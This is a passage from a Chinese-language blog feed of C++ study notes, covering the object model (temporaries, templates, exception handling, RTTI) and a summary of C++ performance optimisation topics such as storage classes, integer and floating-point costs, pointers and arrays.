</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述两个类的大小相同，因此将Derived对象放在Base对象中是安全的，但是在最后一句代码中<code>b.f()</code>调用的是哪一个类的<code>f()</code>。答案是<code>Base::f()</code>的。</p><p>虽然此时b中存储的实际上是一个Derived对象，但是，通过一个对象来调用虚函数，将被静态决议出来，虚函数机制不会被启用。</p><h3><span id="63-临时性对象temporaryobjects">6.3 临时性对象（TemporaryObjects）</span></h3><h4><span id="何时生成临时对象">何时生成临时对象</span></h4><p>程序片段：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">T a, b;<br>T c = a + b;<br></code></pre></div></td></tr></table></figure><p>编译器更愿意直接调用拷贝构造函数的方式将a+b的值放到c中，这样就不需要临时对象，和它的构造函数和拷贝构造函数的调用了。如果operator+的定义符合NRV优化的条件，那么NRV优化的开启，将使得拷贝构造函数的调用和namedobject的析构函数都免了。</p><p>所以比先声明 c 对象，再进行<code>c = a + b</code>要高效。</p><h4><span id="临时对象的生命周期">临时对象的生命周期</span></h4><p>临时性对象在完整表达式尚未评估完全之前，不得被摧毁。临时性对象的摧毁应当作为造成产生这个临时对象的完整表达式的最后一个步骤。</p><p>对于下面的程序：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">string s1("hello "), s2("world "), s3("by Adoo");<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; s1 + s2 + s3 &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br></code></pre></div></td></tr></table></figure><p>显然保存<code>s1+s2</code>结果的临时对象，如果在与s3进行加法之前析构，将会带来大麻烦。</p><h2><span id="七-站在对象模型的尖端">七、站在对象模型的尖端</span></h2><p>C++语言三个著名的扩充性质，它们都会影响C++对象。它们分别是template、exceptionhandling（EH）和runtime type identification（RTTI）。</p><h3><span id="71-template">7.1 Template</span></h3><p>有关template的三个主要讨论方向：</p><ol type="1"><li>template的声明。基本来说就是当你声明一个template class、templateclass member function等等时，会发生什么事情。</li><li>如何“实例化（instantiates）”class object、inline nonmember以及member templatefunctions。这些是“每一个编译单位都会拥有一份实例”的东西。</li><li>如何“实例化（instantiates）”nonmember、member templatefunctions以及static template classmembers。这些都是“每一个可执行文件中只需要一份实例”的东西。这也就是一般而言template所带来的问题。</li></ol><h4><span id="template的实例化行为templateinstantiation">Template的“实例化”行为（TemplateInstantiation）</span></h4><p>一个模板只有被使用到，才会被实例化，否则不会被实例化。对于一个实例化后的模板来说，未被调用的成员函数将不会被实例化，只有成员函数被使用时，C++标准才要求实例化他们。其原因，有两点：</p><ul><li><strong>空间和时间效率的考虑，</strong>如果模板类中有100个成员函数，对某个特定类型只有2个函数会被使用，针对另一个特定类型只会使用3个，那么如果将剩余的195个函数实例化将浪费大量的时间和空间。</li><li><strong>使模板有最大的适用性。</strong>并不是实例化出来的每个类型都支持所有模板的全部成员函数所需要的运算符。如果只实例化那些真正被使用的成员函数的话，那么原本在编译期有错误的类型也能够得到支持。</li></ul><p>可以明确的要求在一个文件中将整个类模板实例化：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point3d</span>&lt;float&gt;;</span><br></code></pre></div></td></tr></table></figure><p>也可以显示指定实例化一个模板类的成员函数：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> <span class="hljs-keyword">float</span> Point3d&lt;<span class="hljs-keyword">float</span>&gt;::X() <span class="hljs-keyword">const</span>;<br></code></pre></div></td></tr></table></figure><p>或是针对一个模板函数：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> Point3d&lt;<span class="hljs-keyword">float</span>&gt; <span class="hljs-keyword">operator</span>+(   <br>    <span class="hljs-keyword">const</span> Point3d&lt;<span class="hljs-keyword">float</span>&gt;&amp;, <span class="hljs-keyword">const</span> Point3d&lt;<span class="hljs-keyword">float</span>&gt;&amp; );<br></code></pre></div></td></tr></table></figure><h4><span id="template的错误报告errorreporting-within-a-template">Template的错误报告（ErrorReporting within a Template）</span></h4><p>所以在一个parsing策略之下，所有语汇（lexing）错误和解析（parsing）错误都会在处理template声明的过程中被标示出来。所有与类型有关的检验，如果牵涉到template参数，都必须延迟到真正的实例化操作（instantiation）发生，才得为之。</p><p>目前的编译器，面对一个template声明，在它被一组实际参数实例化之前，只能施行以有限的错误检查。template中那些与语法无关的错误，程序员可能认为十分明显，编译器却让它通过了，只有在特定实例被定义之后，才会发出抱怨。这是目前实现技术上的一个大问题。</p><p>模板的错误报告，使用模板并遇到错误的大概都深有体会，那就是一个灾难。</p><h4><span id="template中的名称决议nameresolution-within-a-template">Template中的名称决议（NameResolution within a Template）</span></h4><p>Template之中，对于一个nonmember name的决议结果，是根据这个name的使用是否与“用以实例化该template的参数类型”有关而决定的。如果其使用互不相关，那么就以“scopeof the templatedeclaration”来决定name。如果其使用互有关联，那么就以“scope of the template instantiation”来决定name。</p><p>这意味着一个编译器必须保持两个scope contexts：</p><ol type="1"><li>“scope of the template declaration”，用以专注于一般的templateclass。</li><li>“scope of the template instantiation”，用以专注于特定的实例。</li></ol><p>编译器的决议（resolution）算法必须决定哪一个才是适当的scope，然后在其中搜寻适当的name。</p><p>第一种情况：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// scope of the template declaration</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">double</span> <span class="hljs-title">foo</span> <span class="hljs-params">( <span class="hljs-keyword">double</span> )</span></span>;  <br>    <br><span class="hljs-keyword">template</span> &lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">type</span> &gt;  </span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">ScopeRules</span>  </span><br><span class="hljs-class">&#123;</span>  <br><span class="hljs-keyword">public</span>:  <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">invariant</span><span class="hljs-params">()</span> </span>&#123;  <br>        _member = foo( _val );  <br>    &#125;  <br>    <br>    <span class="hljs-function">type <span class="hljs-title">type_dependent</span><span class="hljs-params">()</span> </span>&#123;  <br>        <span class="hljs-keyword">return</span> foo( _member );  <br>    &#125;  <br>    <span class="hljs-comment">// ...  </span><br><span class="hljs-keyword">private</span>:  <br>    <span class="hljs-keyword">int</span> _val;  <br>    type _member;  <br>&#125;;<br></code></pre></div></td></tr></table></figure><p>第二种情况:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//scope of the template instantiation  </span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">foo</span><span class="hljs-params">( <span class="hljs-keyword">int</span> )</span></span>;  <br><br><span class="hljs-comment">// ...  </span><br>ScopeRules&lt; <span class="hljs-keyword">int</span> &gt; sr0;  <br>sr0.invariant();<br>sr0.type_dependent();<br></code></pre></div></td></tr></table></figure><p>在“scope of the template instantiation ”中两个foo()都声明在此scope中。sr0.invariant() 中调用的是：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">double</span> <span class="hljs-title">foo</span> <span class="hljs-params">( <span class="hljs-keyword">double</span> )</span></span>;<br></code></pre></div></td></tr></table></figure><p>看上去，应该调用：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">foo</span><span class="hljs-params">( <span class="hljs-keyword">int</span> )</span></span>;<br></code></pre></div></td></tr></table></figure><p>毕竟，_val 的类型是 int 类型，它们才完全匹配。</p><p>而 sr0.type_dependent() 中调用的却在我们意料之中，调用的是:</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">foo</span><span class="hljs-params">( <span class="hljs-keyword">int</span> )</span></span>;<br></code></pre></div></td></tr></table></figure><p>诸上所述，看上去或合理或不合理的选择，原因在于:</p><p>template 之中， 对于一个非成员名字的决议结果是根据这个 name的使用是否与“用以实例化该模板的参数类型”有关来决定name。如果其使用互不相干，那么就以“scopeof the templatedeclaration”来决定name。如果其使用的互相关联，那么就以“scope of thetemplate instantiation”来决定name。</p><h4><span id="memberfunction的实例化行为member-function-instantiation">MemberFunction的实例化行为（Member Function Instantiation）</span></h4><p>对于 template 的支持，最困难的莫过于templatefunction的实例化（instantiation）。目前的编译器提供了两个策略：一个是编译时期策略，程序代码必须在programtextfile中备妥可用；另一个是链接时期策略，有一些meta-compilation工具可以导引编译器的实例化行为（instantiation）。</p><h3><span id="72-异常处理exceptionhandling">7.2 异常处理（ExceptionHandling）</span></h3><p>欲支持exceptionhandling，编译器的主要工作就是找出catch子句，以处理被抛出来的exception。这多少需要追踪程序堆栈中的每一个函数的目前作用区域（包括追踪函数中localclass objects当时的情况）。同时，编译器必须提供某种查询exception objects的方法，以知道其实际类型（这直接导致某种形式的执行期类型识别，也就是RTTI）。最后，还需要某种机制用以管理被抛出的object，包括它的产生、存储、可能的析构（如果有相关的destructor）、清理（cleanup）以及一般存取。也可能有一个以上的objects同时起作用。一般而言，exceptionhandling机制需要与编译器所产生的数据结构以及执行期的一个exceptionlibrary紧密合作。</p><p>在程序大小和执行速度之间，编译器必须有所抉择：</p><ul><li>为了维护执行速度，编译器可以在编译时期建立起用于支持的数据结构。这会使程序的大小发生膨胀，但编译器可以几乎忽略这些结构，直到有个exception被抛出来。</li><li>为了维护程序大小，编译器可以在执行期建立起用于支持的数据结构。这会影响程序的执行速度，但意味着编译器只有在必要的时候才建立那些数据结构（并且可以抛弃之）。</li></ul><h4><span id="exception-handling">Exception Handling</span></h4><p>快速检阅C++的exception handling由三个主要的语汇组件构成：</p><ol type="1"><li>一个throw子句。它在程序某处发出一个exception。被抛出去的exception可以是内建类型，也可以是使用者自定类型。</li><li>一个或多个catch子句。每一个catch子句都是一个exceptionhandler。它用来表示说，这个子句准备处理某种类型的exception，并且在封闭的大括号区段中提供实际的处理程序</li><li>一个try区段。它被围绕以一系列的叙述句（statements），这些叙述句可能会引发catch子句起作用。</li></ol><p>当一个exception被抛出去时，控制权会从函数调用中被释放出来，并寻找一个吻合的catch子句。如果都没有吻合者，那么默认的处理例程<code>terminate()</code>会被调用。当控制权被放弃后，堆栈中的每一个函数调用也就被推离（poppedup）。这个程序称为unwinding thestack。在每一个函数被推离堆栈之前，函数的local classobjects的destructor会被调用。</p><p>支持EH，会使那些拥有member class subobjects或base classsubobjects（并且它们也都有constructors）的classes的constructor更复杂。一个class如果被部分构造，其destructor必须只施行于那些已被构造的subobjects和（或）memberobjects身上。</p><h4><span id="对exception-handling的支持">对Exception Handling的支持</span></h4><p>当一个exception发生时，编译系统必须完成以下事情：</p><ol type="1"><li>检验发生throw操作的函数。</li><li>决定throw操作是否发生在try区段中。</li><li>若是，编译系统必须把exceptiontype拿来和每一个catch子句进行比较。</li><li>如果比较后吻合，流程控制应该交到catch子句手中。</li><li>如果throw的发生并不在try区段中，或没有一个catch子句吻合，那么系统必须（a）摧毁所有activelocalobjects，（b）从堆栈中将目前的函数“unwind”掉，（c）进行到程序堆栈的下一个函数中去，然后重复上述步骤2～5。</li></ol><h4><span id="决定throw是否发生在一个try区段中">决定throw是否发生在一个try区段中</span></h4><p>还记得吗，一个函数可以被想象为好几个区域：</p><ul><li>try区段以外的区域，而且没有active local objects。</li><li>try区段以外的区域，但有一个（或以上）的active localobjects需要析构。</li><li>try区段以内的区域。</li></ul><p>编译器必须标示出以上各区域，并使它们对执行期的exceptionhandling系统有所作用。一个很棒的策略就是构造出programcounter-range表格。</p><p>回忆一下，programcounter内含下一个即将执行的程序指令。好，为了在一个内含try区段的函数中标示出某个区域，可以把programcounter的起始值和结束值（或是起始值和范围）存储在一个表格中。</p><p>当throw操作发生时，目前的programcounter值被拿来与对应的“范围表格”进行比对，以决定目前作用中的区域是否在一个try区段中。如果是，就需要找出相关的catch子句。如果这个exception无法被处理（或者它被再次抛出），目前的这个函数会从程序堆栈中被推出（popped），而programcounter会被设定为调用端地址，然后这样的循环再重新开始。</p><h4><span id="将exception的类型和每一个catch子句的类型做比较">将exception的类型和每一个catch子句的类型做比较</span></h4><p>对于每一个被抛出来的exception，编译器必须产生一个类型描述器，对exception的类型进行编码。如果那是一个derivedtype，编码内容必须包括其所有base class的类型信息。只编进public baseclass的类型是不够的，因为这个exception可能被一个memberfunction捕捉，而在一个member function的范围（scope）之中，derivedclass和nonpublic base class之间可以转换。</p><p>类型描述器（typedescriptor）是必要的，因为真正的exception是在执行期被处理的，其object必须有自己的类型信息。RTTI正是因为支持EH而获得的副产品。</p><p>编译器还必须为每一个catch子句产生一个类型描述器。执行期的exceptionhandler会将“被抛出之object的类型描述器”和“每一个catch子句的类型描述器”进行比较，直到找到吻合的一个，或是直到堆栈已经被“unwind” 而 <code>terminate()</code>已被调用。</p><p>每一个函数会产生出一个exception表格，它描述与函数相关的各区域、任何必要的善后处理代码（cleanupcode，被local class objectdestructors调用）以及catch子句的位置（如果某个区域是在try区段之中的话）。</p><p>当一个实际对象在程序执行时被抛出，会发生什么事？</p><p>当一个exception被抛出时，exceptionobject会被产生出来并通常放置在相同形式的exception数据堆栈中。从throw端传给catch子句的，是exceptionobject的地址、类型描述器（或是一个函数指针，该函数会传回与该exceptiontype有关的类型描述器对象）以及可能会有的 exception object描述器（如果有人定义它的话）。</p><h4><span id="异常与内存">异常与内存</span></h4><p>异常抛出有可能带来一些问题，比方在一块内存的lock和unlock内存之间，或是在new和delete之间的代码抛出了异常，那么将导致本该进行的unlock或delete操作不能进行。</p><p>在函数被出栈之前，先截住异常，在unlock和delete之后再将异常原样抛出。newexpression的调用不用包括在try块之内是因为，不论在newoperator调用时还是构造函数调用时抛出异常，都会在抛出异常之前释放已分配好的资源，所以不用再调用delete。</p><p>另一个办法是，将这些资源管理的问题，封装在一个类对象中，由析构函数释放资源，这样就不需要对代码进行上面那样的处理——利用函数释放控制权之前会析构所有局部对象的原理。</p><p>同样的道理，适用于数组身上，如果在调用构造函数过程中抛出异常，那么之前所有被构造好的元素的析构函数被调用，对于抛出异常的该元素，则遵循关于单个对象构造的原则，然后释放已经分配好的内存。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">mumble</span><span class="hljs-params">( <span class="hljs-keyword">void</span> *arena )</span>  </span><br><span class="hljs-function"></span>&#123;  <br>    Point *p;  <br>    p = <span class="hljs-keyword">new</span> Point;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        smLock( arena );  <br>        <span class="hljs-comment">// ...  </span><br>    &#125;  <br>    <span class="hljs-keyword">catch</span> ( ... ) &#123;  <br>        smUnLock( arena );  <br>        <span class="hljs-keyword">delete</span> p;  <br>        <span class="hljs-keyword">throw</span>;  <br>    &#125;  <br>    smUnLock( arena );  <br>    <span class="hljs-keyword">delete</span> p;  <br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="73执行期类型识别runtime-type-identificationrtti">7.3执行期类型识别（Runtime Type Identification，RTTI）</span></h3><h4><span id="type-safedowncast保证安全的向下转换操作">Type-SafeDowncast（保证安全的向下转换操作）</span></h4><p>一个type-safedowncast必须在执行期对指针有所查询，看看它是否指向它所展现（表达）之object的真正类型。因此，欲支持type-safedowncast，在object空间和执行时间上都需要一些额外负担：</p><ul><li>需要额外的空间以存储类型信息（typeinformation），通常是一个指针，指向某个类型信息节点。</li><li>需要额外的时间以决定执行期的类型（runtimetype），因为，正如其名所示，这需要在执行期才能决定。</li></ul><p>C++的RTTI机制提供了一个安全的downcast设备，但只对那些展现“多态（也就是使用继承和动态绑定）”的类型有效。</p><p>在C++中，一个具备多态性质的class（所谓的polymorphicclass），正是内含着继承而来（或直接声明）的virtual functions。</p><p>从编译器的角度来看，这个策略还有其他优点，就是大量降低额外负担。所有polymorphicclasses的objects都维护了一个指针（vptr），指向virtual functiontable。只要我们把与该class相关的RTTI object 地址放进virtual table中（通常放在第一个slot），那么额外负担就降低为：每一个classobject只多花费一个指针。这一指针只需被设定一次，它是被编译器静态设定的，而非在执行期由class constructor设定。</p><h4><span id="type-safe-dynamiccast保证安全的动态转换">Type-Safe DynamicCast（保证安全的动态转换）</span></h4><p>dynamic_cast运算符可以在执行期决定真正的类型。如果downcast是安全的（也就是说，如果basetype pointer指向一个derived classobject），这个运算符会传回被适当转换过的指针。如果downcast不是安全的，这个运算符会传回0。</p><p>什么是dynamic_cast的真正成本呢？pfct的一个类型描述器会被编译器产生出来。由pt所指向的classobject类型描述器必须在执行期通过vptr取得。type_info是C++Standard所定义的类型描述器的class名称，该class中放置着待索求的类型信息。virtualtable的第一个slot内含type_info object 的地址；此type_infoobject与pt所指的class type有关。这两个类型描述器被交给一个runtimelibrary函数，比较之后告诉我们是否吻合。</p><h4><span id="references不同于pointers">References不同于Pointers</span></h4><p>程序执行中对一个class指针类型施以dynamic_cast 运算符：</p><ul><li>如果传回真正的地址，则表示这一object的动态类型被确认了，一些与类型有关的操作现在可以施行于其上。</li><li>如果传回0，则表示没有指向任何object，意味着应该以另一种逻辑施行于这个动态类型未确定的object身上。</li></ul><p>因此当dynamic_cast运算符施行于一个reference 时，会发生下列事情：</p><ul><li>如果reference真正cast到适当的derivedclass，downcast会被执行而程序可以继续进行。</li><li>如果reference并不真正是某一种derivedclass，那么，由于不能够传回0，因此抛出一个 bad_cast exception。</li></ul><p>原因在于指针可以被赋值为0，以表示 no object，但是引用不行。</p><h4><span id="typeid运算符">Typeid运算符</span></h4><p>使用 typeid运算符，就有可能以一个reference达到相同的执行期替代路线（runtime“alternativepathway”）。typeid运算符传回一个constreference，类型为type_info。如果两个type_infoobjects相等，这个equality运算符就传回true。</p><p>typeid可以返回<code>const type_info&amp;</code>，用以获取类型信息。</p><p>虽然RTTI只支持多态类，但<code>typeid</code>和<code>type_info</code>同样可用于内建类型及所有非多态类。与多态类的差别在于，非多态类的<code>type_info</code>对象是静态取得，而多态类的是在执行期获得。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>optimizing software in cpp</title>
      <link href="/posts/2ebe459a.html"/>
      <url>/posts/2ebe459a.html</url>
      
        <content type="html"><![CDATA[<h1><span id="optimizing-in-c">Optimizing in C++</span></h1><h2><span id="1-不同的变量存储位置">1 不同的变量存储位置</span></h2><h3><span id="stack">stack</span></h3><p>函数中的临时变量或对象一般存储在内存空间中的stack区。每当调用函数时，参数和临时变量进栈，当函数返回时，参数和临时变量出栈。栈是内存空间中最高效的存储方式。当临时变量中没有较大对象时，访问栈上的临时变量也基本能用上L1data cache。</p><h3><span id="global-or-static">global or static</span></h3><p>在函数体之外声明的变量称之为global变量，可被任何函数访问。被static修饰的变量称为static变量。</p><p>global和static变量在程序运行期间会被放置于内存空间中的静态数据区。</p><p>静态数据区域分为三个部分：</p><ul><li>一部分存储 const 类型的 global/static 变量</li><li>一部分存储已被初始化的 global/static 变量，</li><li>最后一部分存储未被初始化的 global/static 变量。</li></ul><p>使用静态数据区的好处是，global/static变量在程序启动前就有专门的存储位置，坏处是在程序的生命周期内，这些存储位置将被一直占据，可能会<strong>降低data cache 的效率</strong>。</p><p>所以建议尽量不要使用global变量。</p><h3><span id="register">register</span></h3><p>register变量存储在CPU寄存器中，函数中的临时变量特别适合放到register中。优点很明显，访问register变量比访问RAM快得多。但是CPU寄存器大小是非常有限的，在64位x86架构中，有14个整数寄存器，16个浮点寄存器。</p><h3><span id="volatile">volatile</span></h3><p>volatile用于声明一个变量可被其他线程改变，阻止编译器依赖变量先前缓存的值来进行优化。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> seconds; <span class="hljs-comment">// incremented every second by another thread</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">DelayFiveSeconds</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  seconds = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> (seconds &lt; <span class="hljs-number">5</span>)<br>  &#123;<br>  <span class="hljs-comment">// do nothing while seconds count to 5</span><br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上面的代码如果不声明为 volatile,编译器将任务while条件一直成立，即使别的线程中改变了seconds的值。</p><h3><span id="thread-local">thread-local</span></h3><p>大多数编译器可以使用关键字 <code>__thread</code> 或<code>__declspec(thread)</code>来实现静态变量和全局变量的线程本地存储。这样的变量在每个线程都有一个实例。</p><p>线程本地存储是低效的，因为它是通过存储在线程访问块中的指针进行访问的。因此建议尽量避免线程本地存储，代之以stack存储。</p><h3><span id="dynamic-memory-allocation">dynamic memory allocation</span></h3><p>c++中通过new/malloc动态分配存储，通过delete/free释放动态分配的的存储，动态分配的存储放在内存空间的heap区中。</p><p>优点：使用相对stack存储更加灵活</p><p>缺点：动态分配和释放很耗时，容易出现野指针、悬垂指针、内存泄露、内存碎片等问题。</p><h3><span id="variables-declared-inside-aclass">variables declared inside aclass</span></h3><p>类中声明的变量按照在类中的顺序存储，存储位置由类的对象在哪里定义的决定。static修饰的类成员变量将存储在静态数据区，只有一个实例。</p><p>将变量存储在类中的好处是保证了空间局部性，对CPU datacache更友好。</p><h2><span id="2-整型变量和运算符">2 整型变量和运算符</span></h2><h3><span id="整数大小">整数大小</span></h3><p>对于不同的平台，不同整数类型(char/short/int/long)的大小可能不同。</p><p>无论大小如何，整数运算基本都很快，除非使用了大于CPU寄存器大小的类型，比如在32位系统中使用64位整数。</p><p>建议在与大小无关且没有溢出风险的情况下使用默认整数大小，例如简单变量、循环计数器等。</p><p>在大型数组中，为了更好地使用数据缓存，最好使用足够大的最小整数大小。</p><h3><span id="无符号整形数-vs有符号整形数">无符号整形数 vs.有符号整形数</span></h3><p>在大多数情况下，使用有符号整数和无符号整数在速度上没有区别。 除了</p><ol type="1"><li>除以常数：当你将一个整数除以一个常数时，无符号要快于有符号</li><li>对于大多数指令集，有符号整数比无符号整数转换成浮点数要快</li><li>有符号变量和无符号变量的溢出行为不同。</li></ol><h3><span id="整数运算符">整数运算符</span></h3><p>整数运算非常快。加减和位操作只需一个时钟周期，乘法需要3-4个时钟周期，除法需要40-80个。</p><h3><span id="自增和自减运算符">自增和自减运算符</span></h3><p>当仅用于递增整数变量时，使用递增前或递增后都没有区别。</p><p>例如，for (i=0; i&lt;n; i++)和for (i=0; i&lt;n; ++i)是一样的。</p><p>但是当<strong>使用表达式的结果</strong>时，效率可能会有所不同。</p><p>例如，x = array[i++] 比 x = array[++i]速度更快。因为在后一种情况下，数组元素的地址的计算必须等待 i的新值，这将使 x的可用性延迟大约两个时钟周期。<strong>BUT</strong>，两者表达的意思是完全不同的。</p><h2><span id="3-浮点计算和运算符">3 浮点计算和运算符</span></h2><p>x86架构中有两种浮点计算方法。</p><ul><li>原始方法：使用8个浮点寄存器组成寄存器栈(长双精度80位)。<ul><li>优点：精度高，不同精度之间无需额外转换，有浮点计算指令可用；</li><li>缺点：难以生成寄存器变量，浮点计算较慢，整数和浮点数之间转换效率很低</li></ul></li><li>向量方法：使用8个或16个向量寄存器(XMM或YMM)。<ul><li>优点：可并行计算，寄存器变量容易实现；</li><li>缺点：不支持长双精度，数学函数必须使用函数库(但通常比硬件指令更快)</li></ul></li></ul><p>XMM向量寄存器在x86_64架构中可用。如果处理器和操作系统支持AVX指令集，则可使用YMM向量寄存器。当XMM可用时，编译器一般用向量方法计算浮点数。</p><p>根据微处理器的不同，浮点加法需要 3‐6 个时钟周期。乘法需要 4‐8个时钟周期。除法需要 14‐45 个时钟周期。</p><h2><span id="4-枚举">4 枚举</span></h2><p>枚举只是隐藏的整数。</p><h2><span id="5-布尔值">5 布尔值</span></h2><h3><span id="布尔操作数的顺序">布尔操作数的顺序</span></h3><p>短路逻辑：当 <code>&amp;&amp;</code>的左操作数为false时，便不会计算右操作数。同理, <code>||</code>的做操作数为true时，也不会计算右操作数。因此建议将通常为true的操作数放在&amp;&amp;表达式最后，或||表达式的开头。</p><h3><span id="布尔变量被过度检查">布尔变量被过度检查</span></h3><p>由于所有以布尔变量作为输入的运算符都要检查输入是否有除0或1之外的值，因此布尔变量会被过度检查。如果知道操作数除了0 就是 1，布尔运算可以变得有效率的多。</p><p>编译器之所以不这样假设，是因为变量可能是没有被初始化的或者是来自其它未知来源的。</p><h3><span id="布尔向量操作">布尔向量操作</span></h3><p>一个整数可被当做布尔向量操作。例如 bitmap</p><h2><span id="6-指针和引用">6 指针和引用</span></h2><h3><span id="指针-vs-引用">指针 vs. 引用</span></h3><p>指针和引用的效率是一样的，因为它们实际上做的事情是相同的，区别在于编程风格。</p><p>指针的优点：功能上更灵活，可以做指针计算(例如访问缓冲区)，当然也更容易出错</p><p>引用的优点：语法更简单，也更安全。</p><h3><span id="效率">效率</span></h3><p>运行时，需要一个额外的寄存器来保存指针或引用的值，而寄存器是一种稀缺资源，如果没有足够的寄存器，那么指针每次使用时都必须从内存中加载，这会使程序变慢。</p><p>另一个缺点是指针的值需要几个时钟周期才能访问所指向的变量。也就是说，要读取指针或引用的值，最坏情况下需要访问两次内存。</p><h3><span id="函数指针">函数指针</span></h3><p>通过函数指针调用函数通常要比直接调用函数多花几个时钟周期 。</p><h3><span id="智能指针">智能指针</span></h3><p>使用智能指针的目的是为了确保对象被正确删除，以及在对象不再使用时释放内存。</p><p>通过智能指针访问对象没有额外的成本。但是，每当创建、删除、复制或从一个函数转移到另一个函数时，都会产生额外的成本。shared_ptr的这些成本要高于 unique_ptr。</p><h2><span id="7-数组">7 数组</span></h2><p>数组是通过在内存中连续存储元素来实现的，没有存储关于数组大小的信息。因此c/c++中数组相比其他语言更快，但也更不安全。</p><p>当不按顺序索引时，为了使地址的计算更高效，那么除了第一个维度外，所有维度的大小最好是2 的幂。当以非顺序访问元素，则对象的大小（以字节为单位）最好为 2的幂。</p><p>上述建议是为了更好利用CPU的data cache。</p><h2><span id="8-类型转换">8 类型转换</span></h2><h3><span id="signedunsigned转换">signed/unsigned转换</span></h3><p>寄存器值不变，只是编译器换了解释方法。因此没有额外的性能成本。</p><h3><span id="整形类型大小的转换">整形类型大小的转换</span></h3><p>类型大小转换通常不需要额外的时间</p><h3><span id="浮点进度转换">浮点进度转换</span></h3><p>当使用浮点寄存器时，浮点、双精度和长双精度之间的转换不需要额外的时间</p><p>当用XMM寄存器时，需要 2 到 15个时钟周期（取决于处理器）</p><blockquote><p>因此建议使用向量化寄存器存储浮点数时，不要混用浮点类型。</p></blockquote><h3><span 